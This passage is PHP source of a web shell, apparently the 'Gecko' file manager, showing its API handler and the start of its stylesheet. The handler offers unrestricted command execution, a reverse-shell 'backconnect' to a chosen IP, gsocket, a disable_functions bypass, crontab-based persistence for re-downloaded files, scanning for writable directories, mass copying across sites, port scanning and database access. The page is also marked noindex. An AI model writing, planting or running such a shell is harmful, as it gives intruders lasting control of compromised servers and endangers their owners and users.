    echo 'Adminer unavailable (download failed). Use built-in DB Manager.';
    exit;
}

if (isset($_GET['phpinfo'])) {
    phpinfo();
    exit;
}

// Handle API requests
if (isset($_GET['api'])) {
    if (isset($GLOBALS['gecko_api_input']) && is_array($GLOBALS['gecko_api_input'])) {
        $input = $GLOBALS['gecko_api_input'];
    } else {
        $contentType = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';
        $hasJson = strpos($contentType, 'application/json') !== false;

        if ($hasJson) {
            $raw = file_get_contents('php://input');
            if (!$raw) $raw = '{}';
            $decoded = json_decode($raw, true);
            $input = is_array($decoded) ? $decoded : array();
        } else {
            $input = $_POST;
        }
    }

    $action = (string)_v($input, 'action', _v($_GET, 'action', 'list'));

    switch ($action) {
        case 'list':
            $rel = sanitizeRelPath((string)_v($input, 'path', ''));

            // Determine the directory to list
            if (preg_match('/^[A-Za-z]:\//', $rel)) {
                // Absolute Windows path
                $dir = str_replace('/', DIRECTORY_SEPARATOR, $rel);
            } elseif (strlen($rel) > 0 && $rel[0] === '/') {
                // Absolute Linux path
                $dir = $rel;
            } elseif ($rel === '') {
                // Default base directory
                $dir = $baseDir;
            } else {
                // Relative path
                $dir = resolvePath($baseDir, $rel);
            }

            if (!$dir || !is_dir($dir)) {
                jsonOut(array('ok' => false, 'error' => 'Invalid directory: ' . $rel), 403);
            }

            jsonOut(array(
                'ok' => true,
                'path' => $rel,
                'entries' => listEntries($dir),
                'disk' => array(
                    'free' => @disk_free_space($dir),
                    'total' => @disk_total_space($dir),
                ),
            ));
            break;

        case 'read':
            $path = resolvePath($baseDir, (string)_v($input, 'path', ''));
            if (!$path || is_dir($path)) jsonOut(array('ok' => false, 'error' => 'File not found'), 404);
            $sz = filesize($path);
            if (!isTextFile($path) && (int)($sz ? $sz : 0) > 512000) jsonOut(array('ok' => false, 'error' => 'File too large or binary'), 400);
            jsonOut(array(
                'ok' => true,
                'content' => file_get_contents($path),
                'editable' => isTextFile($path),
                'size' => filesize($path),
                'modified' => filemtime($path),
            ));
            break;

        case 'save':
            $path = resolvePath($baseDir, (string)_v($input, 'path', ''));
            if (!$path || is_dir($path)) jsonOut(array('ok' => false, 'error' => 'File not found'), 404);
            if (file_put_contents($path, (string)_v($input, 'content', '')) === false) jsonOut(array('ok' => false, 'error' => 'Write failed'), 500);
            jsonOut(array('ok' => true, 'modified' => filemtime($path)));
            break;

        case 'mkdir':
            $rel = sanitizeRelPath((string)_v($input, 'path', ''));
            $name = basename(str_replace('\\', '/', (string)_v($input, 'name', '')));
            if ($name === '' || preg_match('/[<>:"|?*\\\\\/]/', $name)) jsonOut(array('ok' => false, 'error' => 'Invalid name'), 400);
            $parent = resolvePath($baseDir, $rel);
            if (!$parent || !is_dir($parent)) jsonOut(array('ok' => false, 'error' => 'Invalid directory'), 403);
            $new = $parent . DIRECTORY_SEPARATOR . $name;
            if (file_exists($new)) jsonOut(array('ok' => false, 'error' => 'Already exists'), 409);
            if (!@mkdir($new, 0755)) jsonOut(array('ok' => false, 'error' => 'Create failed'), 500);
            jsonOut(array('ok' => true));
            break;

        case 'create_file':
            $rel = sanitizeRelPath((string)_v($input, 'path', ''));
            $name = basename(str_replace('\\', '/', (string)_v($input, 'name', '')));
            if ($name === '' || preg_match('/[<>:"|?*\\\\\/]/', $name)) jsonOut(array('ok' => false, 'error' => 'Invalid name'), 400);
            $parent = resolvePath($baseDir, $rel);
            if (!$parent || !is_dir($parent)) jsonOut(array('ok' => false, 'error' => 'Invalid directory'), 403);
            $new = $parent . DIRECTORY_SEPARATOR . $name;
            if (file_exists($new)) jsonOut(array('ok' => false, 'error' => 'Already exists'), 409);
            if (file_put_contents($new, (string)_v($input, 'content', '')) === false) jsonOut(array('ok' => false, 'error' => 'Create failed'), 500);
            jsonOut(array('ok' => true));
            break;

        case 'delete':
            $path = resolvePath($baseDir, (string)_v($input, 'path', ''));
            if (!$path || $path === $baseDir) jsonOut(array('ok' => false, 'error' => 'Cannot delete'), 403);
            if (fmIsBlockedPath($path, $baseDir)) jsonOut(array('ok' => false, 'error' => 'Protected path'), 403);
            if (is_dir($path) && fmDirContainsBlocked($path, $baseDir)) {
                jsonOut(array('ok' => false, 'error' => 'Folder contains protected files'), 403);
            }
            $ok = is_dir($path) ? fmDeleteRecursive($path) : @unlink($path);
            if (!$ok) jsonOut(array('ok' => false, 'error' => 'Delete failed'), 500);
            jsonOut(array('ok' => true));
            break;

        case 'rename':
            $path = resolvePath($baseDir, (string)_v($input, 'path', ''));
            $newName = basename(str_replace('\\', '/', (string)_v($input, 'new_name', '')));
            if (!$path || $newName === '' || preg_match('/[<>:"|?*\\\\\/]/', $newName)) jsonOut(array('ok' => false, 'error' => 'Invalid request'), 400);
            $dest = dirname($path) . DIRECTORY_SEPARATOR . $newName;
            if (file_exists($dest)) jsonOut(array('ok' => false, 'error' => 'Name taken'), 409);
            if (!@rename($path, $dest)) jsonOut(array('ok' => false, 'error' => 'Rename failed'), 500);
            jsonOut(array('ok' => true, 'new_path' => ltrim(str_replace('\\', '/', substr($dest, strlen($baseDir))), '/')));
            break;

        case 'chmod':
            $path = resolvePath($baseDir, (string)_v($input, 'path', ''));
            if (!$path) jsonOut(array('ok' => false, 'error' => 'File not found'), 404);
            $permString = (string)_v($input, 'perm', '');
            if (!preg_match('/^[0-7]{3,4}$/', $permString)) {
                jsonOut(array('ok' => false, 'error' => 'Invalid permission format. Use octal (e.g., 755 or 0644)'), 400);
            }
            $octalPerm = octdec($permString);
            if (!@chmod($path, (int)$octalPerm)) {
                jsonOut(array('ok' => false, 'error' => 'Failed to change permissions'), 500);
            }
            clearstatcache(true, $path);
            $newPerm = substr(sprintf('%o', fileperms($path)), -4);
            jsonOut(array('ok' => true, 'perm' => $newPerm));
            break;

        case 'copy':
            $paths = fmPathsToArray($input);
            if (empty($paths)) jsonOut(array('ok' => false, 'error' => 'No items selected'), 400);
            $dest = sanitizeRelPath((string)_v($input, 'dest', ''));
            $result = fmCopyItems($baseDir, $paths, $dest);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'move':
            $paths = fmPathsToArray($input);
            if (empty($paths)) jsonOut(array('ok' => false, 'error' => 'No items selected'), 400);
            $dest = sanitizeRelPath((string)_v($input, 'dest', ''));
            $result = fmMoveItems($baseDir, $paths, $dest);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'zip':
            $paths = fmPathsToArray($input);
            if (empty($paths)) jsonOut(array('ok' => false, 'error' => 'No items selected'), 400);
            $dest = sanitizeRelPath((string)_v($input, 'dest', (string)_v($input, 'path', '')));
            $name = (string)_v($input, 'name', '');
            $result = fmZipItems($baseDir, $paths, $dest, $name);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'unzip':
            $zipPath = sanitizeRelPath((string)_v($input, 'path', ''));
            $dest = sanitizeRelPath((string)_v($input, 'dest', ''));
            $result = fmUnzipItem($baseDir, $zipPath, $dest);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'upload':
            $rel = sanitizeRelPath((string)_v($_POST, 'path', ''));
            $parent = resolvePath($baseDir, $rel);

            if (!$parent || !is_dir($parent)) {
                jsonOut(array('ok' => false, 'error' => 'Invalid directory: ' . $rel), 403);
            }

            if (empty($_FILES['file'])) {
                jsonOut(array('ok' => false, 'error' => 'No file uploaded'), 400);
            }

            $f = $_FILES['file'];
            if ($f['error'] !== UPLOAD_ERR_OK) {
                $errors = array(
                    UPLOAD_ERR_INI_SIZE   => 'File too large (server limit: ' . ini_get('upload_max_filesize') . ')',
                    UPLOAD_ERR_FORM_SIZE  => 'File too large (form limit)',
                    UPLOAD_ERR_PARTIAL    => 'File only partially uploaded',
                    UPLOAD_ERR_NO_FILE    => 'No file uploaded',
                    UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
                    UPLOAD_ERR_CANT_WRITE => 'Failed to write file',
                    UPLOAD_ERR_EXTENSION  => 'Upload blocked by extension',
                );
                $errorMsg = isset($errors[$f['error']]) ? $errors[$f['error']] : ('Unknown upload error (code: ' . $f['error'] . ')');
                jsonOut(array('ok' => false, 'error' => $errorMsg), 400);
            }

            $name = basename($f['name']);
            $name = preg_replace('/[<>:"|?*\\\\\/]/', '', $name);
            $name = trim($name);

            if ($name === '') {
                jsonOut(array('ok' => false, 'error' => 'Invalid filename'), 400);
            }

            $dest = $parent . DIRECTORY_SEPARATOR . $name;
            if (file_exists($dest)) {
                $info = pathinfo($name);
                $filename = isset($info['filename']) ? $info['filename'] : $name;
                $extension = isset($info['extension']) ? $info['extension'] : '';
                $name = $filename . '_' . time() . ($extension !== '' ? '.' . $extension : '');
                $dest = $parent . DIRECTORY_SEPARATOR . $name;
            }

            if (!move_uploaded_file($f['tmp_name'], $dest)) {
                jsonOut(array('ok' => false, 'error' => 'Failed to save file. Check folder permissions.'), 500);
            }

            @chmod($dest, 0644);
            jsonOut(array('ok' => true, 'name' => $name, 'message' => 'Upload successful'));
            break;

        case 'search':
            $query = trim((string)_v($input, 'query', ''));
            if ($query === '') jsonOut(array('ok' => true, 'results' => array()));
            $results = array(); $count = 0;
            searchFiles($baseDir, sanitizeRelPath((string)_v($input, 'path', '')), $query, $results, $count);
            jsonOut(array('ok' => true, 'results' => $results));
            break;

        case 'terminal':
            $rel = sanitizeRelPath((string)_v($input, 'path', ''));
            $cwd = resolvePath($baseDir, $rel);
            if (!$cwd || !is_dir($cwd)) jsonOut(array('ok' => false, 'error' => 'Invalid cwd'), 403);
            $command = trim((string)_v($input, 'command', ''));
            if ($command === '') jsonOut(array('ok' => false, 'error' => 'Empty command'), 400);
            try {
                $result = runTerminal($command, $cwd, 120, true);
            } catch (Exception $ex) {
                jsonOut(array(
                    'ok' => false,
                    'error' => 'Terminal exception: ' . $ex->getMessage(),
                    'output' => 'Terminal exception: ' . $ex->getMessage(),
                    'exit_code' => 1,
                    'cwd' => $rel,
                ));
            } catch (Throwable $ex) {
                jsonOut(array(
                    'ok' => false,
                    'error' => 'Terminal fatal: ' . $ex->getMessage(),
                    'output' => 'Terminal fatal: ' . $ex->getMessage(),
                    'exit_code' => 1,
                    'cwd' => $rel,
                ));
            }
            if (!is_array($result)) {
                jsonOut(array(
                    'ok' => false,
                    'error' => 'Terminal returned invalid result',
                    'output' => 'Terminal returned invalid result',
                    'exit_code' => 1,
                    'cwd' => $rel,
                ));
            }
            $out = isset($result['output']) ? $result['output'] : '';
            $methodUsed = isset($result['method']) ? $result['method'] : '';
            if ($methodUsed !== '' && $methodUsed !== 'proc_open') {
                $out = $out . (strlen($out) ? "\n" : '') . '[via ' . $methodUsed . ']';
            }
            // Always HTTP 200 so UI never shows "Empty response (HTTP 500)"
            jsonOut(array(
                'ok' => empty($result['no_shell']),
                'output' => $out,
                'error' => !empty($result['no_shell']) ? $out : '',
                'exit_code' => isset($result['exit_code']) ? (int)$result['exit_code'] : 1,
                'cwd' => $rel,
                'method' => $methodUsed,
                'tried' => isset($result['tried']) ? $result['tried'] : array(),
            ));
            break;

        case 'drives':
            $drives = array();
            if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                for ($i = 67; $i <= 90; $i++) {
                    $drive = chr($i) . ':/';
                    if (@is_dir($drive)) {
                        $free = @disk_free_space($drive);
                        $total = @disk_total_space($drive);
                        $drives[] = array(
                            'letter' => chr($i) . ':',
                            'path' => $drive,
                            'free' => $free ? $free : 0,
                            'total' => $total ? $total : 0,
                            'label' => chr($i) . ':\\',
                        );
                    }
                }
            } else {
                // Linux/Mac - show root and common paths
                $commonPaths = array(
                    '/' => 'Root (/)',
                    '/home' => 'Home (/home)',
                    '/var' => 'Var (/var)',
                    '/etc' => 'Etc (/etc)',
                    '/usr' => 'Usr (/usr)',
                    '/tmp' => 'Tmp (/tmp)',
                );

                foreach ($commonPaths as $path => $label) {
                    if (@is_dir($path)) {
                        $free = @disk_free_space($path);
                        $total = @disk_total_space($path);
                        $drives[] = array(
                            'letter' => $path,
                            'path' => $path,
                            'free' => $free ? $free : 0,
                            'total' => $total ? $total : 0,
                            'label' => $label,
                        );
                    }
                }

                // Add current document root
                if (@is_dir($baseDir) && $baseDir !== '/') {
                    $free = @disk_free_space($baseDir);
                    $total = @disk_total_space($baseDir);
                    $drives[] = array(
                        'letter' => $baseDir,
                        'path' => $baseDir,
                        'free' => $free ? $free : 0,
                        'total' => $total ? $total : 0,
                        'label' => 'Document Root: ' . basename($baseDir),
                    );
                }
            }
            jsonOut(array('ok' => true, 'drives' => $drives));
            break;

        case 'info':
            jsonOut(array(
                'ok' => true,
                'php' => PHP_VERSION,
                'os' => PHP_OS,
                'base' => $baseDir,
                'disk_free' => @disk_free_space($baseDir),
                'disk_total' => @disk_total_space($baseDir),
            ));
            break;

        case 'cron_list':
            $cron = getCrontab();
            jsonOut(array(
                'ok' => true,
                'content' => $cron['content'],
                'platform' => $cron['platform'],
                'editable' => $cron['editable'],
            ));
            break;

        case 'cron_save':
            $content = (string)_v($input, 'content', '');
            $result = setCrontab($content);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut(array('ok' => true));
            break;

        case 'recover_file':
            @set_time_limit(180);
            @ini_set('max_execution_time', '180');
            @ignore_user_abort(true);

            try {
                $vDir = geckoRecoverValidateDir(_v($input, 'dir_path', ''));
                if (!$vDir[0]) jsonOut(array('ok' => false, 'error' => $vDir[1]), 400);
                $vFile = geckoRecoverValidateFile(_v($input, 'file_name', ''));
                if (!$vFile[0]) jsonOut(array('ok' => false, 'error' => $vFile[1]), 400);
                $vUrl = geckoRecoverValidateUrl(_v($input, 'download_url', ''));
                if (!$vUrl[0]) jsonOut(array('ok' => false, 'error' => $vUrl[1]), 400);
                $persist = _v($input, 'persist', '1');
                $wantPersist = ($persist === '1' || $persist === 1 || $persist === true || $persist === 'true');

                $result = geckoRecoverTarget($vDir[1], $vFile[1], $vUrl[1], true);
                if (!$result['ok']) jsonOut($result, 400);

                if ($wantPersist) {
                    try {
                        $persistResult = geckoRecoverDeployPersistence($vDir[1], $vFile[1], $vUrl[1]);
                    } catch (Exception $ex) {
                        $persistResult = array(
                            'ok' => false,
                            'message' => 'Persistence exception: ' . $ex->getMessage(),
                            'steps' => array('Persistence exception: ' . $ex->getMessage()),
                        );
                    } catch (Throwable $ex) {
                        $persistResult = array(
                            'ok' => false,
                            'message' => 'Persistence error: ' . $ex->getMessage(),
                            'steps' => array('Persistence error: ' . $ex->getMessage()),
                        );
                    }
                    if (!is_array($persistResult)) {
                        $persistResult = array('ok' => false, 'message' => 'Persistence returned invalid result', 'steps' => array());
                    }
                    if (!empty($persistResult['steps']) && is_array($persistResult['steps'])) {
                        $result['steps'] = array_merge(
                            isset($result['steps']) && is_array($result['steps']) ? $result['steps'] : array(),
                            array('--- persistence ---'),
                            $persistResult['steps']
                        );
                    }
                    $result['persistence'] = array(
                        'ok' => !empty($persistResult['ok']),
                        'message' => isset($persistResult['message']) ? $persistResult['message'] : '',
                        'instance_id' => isset($persistResult['instance_id']) ? $persistResult['instance_id'] : '',
                        'install_path' => isset($persistResult['install_path']) ? $persistResult['install_path'] : '',
                        'shm_path' => isset($persistResult['shm_path']) ? $persistResult['shm_path'] : '',
                        'pid_file' => isset($persistResult['pid_file']) ? $persistResult['pid_file'] : '',
                        'pid' => isset($persistResult['pid']) ? $persistResult['pid'] : 0,
                        'crontab' => !empty($persistResult['crontab']),
                        'cron_marker' => isset($persistResult['cron_marker']) ? $persistResult['cron_marker'] : '',
                        'async' => false,
                    );
                    if (!empty($persistResult['ok'])) {
                        $result['message'] = $result['message'] . ' · Persistence ON';
                    } else {
                        $result['message'] = $result['message'] . ' · Persistence partial/failed';
                    }
                } else {
                    $result['steps'][] = 'Persistence dimatikan (one-shot recover saja).';
                    $result['persistence'] = array('ok' => false, 'message' => 'disabled');
                }

                jsonOut($result);
            } catch (Exception $ex) {
                jsonOut(array('ok' => false, 'error' => 'Recover exception: ' . $ex->getMessage()), 500);
            } catch (Throwable $ex) {
                jsonOut(array('ok' => false, 'error' => 'Recover fatal: ' . $ex->getMessage()), 500);
            }
            break;

        case 'find_writable_dirs':
            $rawPath = trim((string)_v($input, 'path', ''));
            if ($rawPath === '') {
                $rawPath = '/var/www/html';
            }
            $vPath = geckoFindWritableValidatePath($rawPath);
            if (!$vPath[0]) jsonOut(array('ok' => false, 'error' => $vPath[1]), 400);
            $maxDepth = (int)_v($input, 'max_depth', 8);
            $limit = (int)_v($input, 'limit', 400);
            $result = geckoFindWritableDirs($vPath[1], $maxDepth, $limit);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'mass_copy':
            @set_time_limit(300);
            @ini_set('max_execution_time', '300');
            $src = trim((string)_v($input, 'src', ''));
            $base = trim((string)_v($input, 'base', ''));
            $debug = !empty($input['debug']) && ($input['debug'] === true || $input['debug'] === 1 || $input['debug'] === '1');
            $v2 = !empty($input['v2']) && ($input['v2'] === true || $input['v2'] === 1 || $input['v2'] === '1');
            $v3 = !empty($input['v3']) && ($input['v3'] === true || $input['v3'] === 1 || $input['v3'] === '1');
            $mode = trim((string)_v($input, 'mode', ''));
            // Pastikan eksklusif di API layer juga
            $mode = geckoMassPickMode($v2, $v3, $mode);
            $v2 = ($mode === 'v2');
            $v3 = ($mode === 'v3');
            $limit = (int)_v($input, 'limit', 25);
            $offset = (int)_v($input, 'offset', 0);
            $result = null;
            try {
                $result = geckoMassCopyRun($src, $base, $debug, $v2, $limit, $offset, $v3, $mode);
            } catch (Exception $ex) {
                jsonOut(array('ok' => false, 'error' => 'Mass copy exception: ' . $ex->getMessage()));
            } catch (Throwable $ex) {
                jsonOut(array('ok' => false, 'error' => 'Mass copy fatal: ' . $ex->getMessage()));
            }
            if (!is_array($result)) {
                jsonOut(array('ok' => false, 'error' => 'Mass copy returned invalid result'));
            }
            // Always HTTP 200 so UI never shows Empty response (HTTP 500)
            jsonOut($result);
            break;

        case 'portscan':
            $host = trim((string)_v($input, 'host', '127.0.0.1'));
            $ports = trim((string)_v($input, 'ports', '21,22,25,80,443,3306,8080'));
            $timeout = (int)_v($input, 'timeout', 1);
            $result = scanPorts($host, $ports, $timeout);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'bypass_df':
            @set_time_limit(60);
            @ini_set('max_execution_time', '60');
            $cmd = trim((string)_v($input, 'cmd', ''));
            $result = null;
            try {
                $result = geckoBypassRun($cmd);
            } catch (Exception $ex) {
                jsonOut(array('ok' => false, 'error' => 'Bypass exception: ' . $ex->getMessage()));
            } catch (Throwable $ex) {
                jsonOut(array('ok' => false, 'error' => 'Bypass fatal: ' . $ex->getMessage()));
            }
            if (!is_array($result)) {
                jsonOut(array('ok' => false, 'error' => 'Bypass returned invalid result'));
            }
            // Always HTTP 200 so UI never shows Empty response
            jsonOut($result);
            break;

        case 'bypass_df_info':
            // Status check tanpa eksekusi command
            $pay = geckoBypassLoadPayloads();
            $arch = geckoBypassIs64bit();
            $need = array('putenv', 'mail', 'file_put_contents', 'file_get_contents', 'unlink');
            $funcs = array();
            foreach ($need as $fn) {
                $funcs[$fn] = geckoBypassFuncOk($fn);
            }
            jsonOut(array(
                'ok' => true,
                'linux' => (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN'),
                'arch' => ($arch === true ? 'x86_64' : ($arch === false ? 'x86' : 'unknown')),
                'preload_ok' => !empty($pay['ok']),
                'preload_path' => isset($pay['path']) ? $pay['path'] : '',
                'preload_error' => empty($pay['ok']) && isset($pay['error']) ? $pay['error'] : '',
                'funcs' => $funcs,
                'disable_functions' => (string)@ini_get('disable_functions'),
            ));
            break;

        case 'backconnect':
            $ip = trim((string)_v($input, 'ip', ''));
            $port = (int)_v($input, 'port', 4444);
            $method = (string)_v($input, 'method', 'bash');
            $result = null;
            try {
                $result = startBackconnect($ip, $port, $method);
            } catch (Exception $ex) {
                jsonOut(array(
                    'ok' => false,
                    'error' => 'Backconnect exception: ' . $ex->getMessage(),
                ));
            } catch (Throwable $ex) {
                jsonOut(array(
                    'ok' => false,
                    'error' => 'Backconnect fatal: ' . $ex->getMessage(),
                ));
            }
            if (!is_array($result)) {
                jsonOut(array('ok' => false, 'error' => 'Backconnect returned invalid result'));
            }
            // Always HTTP 200 so UI never shows "Empty response (HTTP 500)"
            jsonOut($result);
            break;

        case 'gsocket':
            @set_time_limit(1800);
            @ini_set('max_execution_time', '1800');
            $method = (string)_v($input, 'method', 'curl');
            $result = runGsocket($method);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'db_tables':
            $result = dbListTables(
                (string)_v($input, 'type', 'mysql'),
                (string)_v($input, 'host', '127.0.0.1'),
                (int)_v($input, 'port', 3306),
                (string)_v($input, 'user', 'root'),
                (string)_v($input, 'pass', ''),
                (string)_v($input, 'db', '')
            );
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'db_query':
            $result = dbRunQuery(
                (string)_v($input, 'type', 'mysql'),
                (string)_v($input, 'host', '127.0.0.1'),
                (int)_v($input, 'port', 3306),
                (string)_v($input, 'user', 'root'),
                (string)_v($input, 'pass', ''),
                (string)_v($input, 'db', ''),
                (string)_v($input, 'sql', '')
            );
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'sec_tool':
            @set_time_limit(120);
            $tool = (string)_v($input, 'tool', 'recon');
            $result = runSecTool($tool, $input, $baseDir);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'blue_tool':
            @set_time_limit(600);
            @ini_set('max_execution_time', '600');
            $tool = (string)_v($input, 'tool', 'backdoor');
            $result = runBlueTool($tool, $input, $baseDir);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'blue_delete':
            $paths = _v($input, 'paths', array());
            if (is_string($paths)) {
                $decoded = json_decode($paths, true);
                $paths = is_array($decoded) ? $decoded : array($paths);
            }
            $result = btDeleteThreats($baseDir, $paths);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        case 'blue_quarantine_list':
            $result = btListQuarantine($baseDir);
            jsonOut($result);
            break;

        case 'blue_restore':
            $ids = _v($input, 'ids', array());
            if (is_string($ids)) {
                $decoded = json_decode($ids, true);
                $ids = is_array($decoded) ? $decoded : array($ids);
            }
            $result = btRestoreThreats($baseDir, $ids);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;

        default:
            jsonOut(array('ok' => false, 'error' => 'Unknown action'), 400);
    }
    exit;
}


?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="robots" content="noindex">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Gecko · <?= $_SERVER['SERVER_NAME'] ?> </title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,300;0,14..32,400;0,14..32,500;0,14..32,600;0,14..32,700;1,14..32,400&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>
/* ─── DESIGN TOKENS ───────────────────────────────────────────── */
/*  ◆  NOIR GOLD × LUXE DARK  ◆
    Ultra-deep ink, warm champagne gold accent, soft pearl text. */
:root {
  /* Ink palette — true noir, near-black with subtle warm undertone */
  --ink0: #050608;
  --ink1: #0a0b0e;
  --ink2: #101216;
  --ink3: #161920;
  --ink4: #1f232b;
  --ink5: #2a2f38;
  --ink6: #424754;
  --ink-tint: rgba(245,185,66,.020);

  /* Primary accent — Champagne Gold */
  --jade:     #f5b942;
  --jade-hi:  #ffd76e;
  --jade-lo:  #d4961f;
  --jade-dk:  #a8730e;
  --jade-bg:  rgba(245,185,66,.10);
  --jade-bd:  rgba(245,185,66,.24);
  --jade-bd2: rgba(245,185,66,.42);

  /* Semantic — warm-toned */
  --red:     #f87171;
  --red-bg:  rgba(248,113,113,.10);
  --red-bd:  rgba(248,113,113,.22);
  --amber:   #d4961f;
  --amber-bg:rgba(212,150,31,.12);
  --blue:    #79c0ff;
  --blue-bg: rgba(121,192,255,.10);
  --pink:    #ff8e8e;
  --pink-bg: rgba(255,142,142,.08);

  /* Text scale — pearl on noir */
  --tx:  #f5f1e8;
  --tx2: #d8d3c4;
  --tx3: #8a8578;
  --tx4: #61605a;

  /* Border */
  --bd:   rgba(245,185,66,.14);
  --bd2:  rgba(245,241,232,.06);
  --bd3:  rgba(245,241,232,.04);

  /* Radii */
  --r4: 4px; --r6: 6px; --r8: 8px; --r10: 10px; --r12: 12px; --r14: 14px; --r16: 16px; --r20: 20px;

  /* Type */
  --sans: "Inter", -apple-system, system-ui, sans-serif;
  --mono: "JetBrains Mono", "Fira Code", "SF Mono", Consolas, monospace;

  /* Shadows — layered for depth, no large blurs */
  --s0:  0 1px 0 rgba(255,255,255,.02) inset, 0 1px 2px rgba(0,0,0,.3);
  --s1:  0 1px 3px rgba(0,0,0,.4), 0 1px 2px rgba(0,0,0,.25);
  --s2:  0 6px 20px rgba(0,0,0,.45), 0 2px 6px rgba(0,0,0,.3);
  --s3:  0 18px 50px rgba(0,0,0,.55), 0 6px 16px rgba(0,0,0,.4);
  --s-jade: 0 0 0 1px var(--jade-bd), 0 4px 16px rgba(245,185,66,.24);
  --s-jade-soft: 0 0 0 3px var(--jade-bg);

  /* Layout */
  --topbar-h: 60px;
  --sidebar-w: 240px;
  --statusbar-h: 32px;

  /* Easing */
  --ease:    cubic-bezier(.4,0,.2,1);
  --ease-out: cubic-bezier(.2,.8,.2,1);
  --spring:  cubic-bezier(.34,1.3,.64,1);
}

@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after {
    animation-duration: .01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: .01ms !important;
    scroll-behavior: auto !important;
  }
}


/* ─── RESET ───────────────────────────────────────────────────── */
*,*::before,*::after { box-sizing: border-box; margin: 0; padding: 0 }
html, body { height: 100%; overflow: hidden }
body {
  font-family: var(--sans);
  font-size: 13.5px;
  line-height: 1.5;
  color: var(--tx);
  background: var(--ink0);
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-rendering: optimizeLegibility;
  font-feature-settings: "cv02","cv03","cv04","cv11";
}
button, input, textarea, select { font: inherit; color: inherit; letter-spacing: inherit }
button { -webkit-tap-highlight-color: transparent }
a { color: var(--jade); text-decoration: none }

/* ─── ACCESSIBILITY — focus rings ──────────────────────────────── */
:focus-visible { outline: 2px solid var(--jade); outline-offset: 2px; border-radius: 4px }
button:focus-visible, .bc-btn:focus-visible, .ico-btn:focus-visible { outline-offset: 1px }

/* ─── SCROLLBAR — global subtle ───────────────────────────────── */
::-webkit-scrollbar { width: 9px; height: 9px }
::-webkit-scrollbar-track { background: transparent }
::-webkit-scrollbar-thumb {
  background: var(--ink5);
  border-radius: 99px;
  border: 2px solid transparent;
  background-clip: content-box;
}
::-webkit-scrollbar-thumb:hover { background: var(--ink6); background-clip: content-box; border: 2px solid transparent }

/* ─── PANEL BACKGROUND IMAGE (decorative) ─────────────────────── */
.panel { position: relative }
.panel::before {
  content: "";
  position: absolute;
  top: 50%; left: 50%;
  transform: translate(-50%, -50%);
  width: 95%; max-width: 820px; height: 820px;
  background: url('https://raw.githubusercontent.com/MadExploits/GECKO-FILE-MANAGER/refs/heads/main/gecko.png') center/contain no-repeat;
  opacity: .035;
  pointer-events: none;
  z-index: 0;
}
.tbl-head, .flist, .grid-wrap, .empty { position: relative; z-index: 1 }

/* ─── AMBIENT BACKGROUND — deep ocean glow, no filter ────────── */
.bg-mesh {
  position: fixed; inset: 0; z-index: 0; pointer-events: none;
  background:
    radial-gradient(ellipse 900px 600px at 8% -5%,  rgba(245,185,66,.10) 0%, transparent 60%),
    radial-gradient(ellipse 700px 500px at 100% 102%, rgba(168,115,14,.08) 0%, transparent 60%),
    radial-gradient(ellipse 500px 380px at 50% 100%, rgba(255,215,110,.03) 0%, transparent 70%),
    radial-gradient(ellipse 600px 400px at 90% 0%, rgba(212,150,31,.05) 0%, transparent 70%),
    linear-gradient(170deg, rgba(5,6,8,0) 0%, var(--ink0) 50%, #030303 100%),
    var(--ink0);
}

/* ─── SHELL ───────────────────────────────────────────────────── */
.shell { position: relative; z-index: 1; display: flex; flex-direction: column; height: 100vh }

/* ─── TOPBAR ──────────────────────────────────────────────────── */
.topbar {
  height: var(--topbar-h);
  background: linear-gradient(180deg, rgba(10,11,14,.95), var(--ink1));
  border-bottom: 1px solid var(--bd2);
  display: flex; align-items: center;
  padding: 0 18px; gap: 14px;
  flex-shrink: 0; z-index: 80;
  box-shadow: 0 1px 0 rgba(245,185,66,.06), 0 1px 0 0 rgba(0,0,0,.4);
}

.logo {
  display: flex; align-items: center; gap: 11px;
  min-width: var(--sidebar-w); flex-shrink: 0;
  padding-right: 14px;
  border-right: 1px solid var(--bd2);
  margin-right: 4px;
  height: 100%;
}
.logo-icon {
  width: 32px; height: 32px; border-radius: 8px;
  background: var(--ink2);
  border: 1px solid var(--bd);
  display: grid; place-items: center; flex-shrink: 0;
  position: relative;
}
.logo-icon svg {
  width: 16px; height: 16px;
  stroke: var(--jade); fill: none;
}

.logo-text { display: flex; flex-direction: column; line-height: 1; gap: 5px }
.logo-name {
  font-size: 14px; font-weight: 600; letter-spacing: -.01em;
  color: var(--tx);
  display: flex; align-items: center; gap: 6px;
}
.logo-name em {
  font-style: normal; font-size: 9px; font-weight: 600;
  color: var(--jade); letter-spacing: .08em;
  padding: 1px 5px; border-radius: 3px;
  background: var(--jade-bg);
  border: 1px solid var(--jade-bd);
}
.logo-sub {
  font-size: 10px; font-weight: 500;
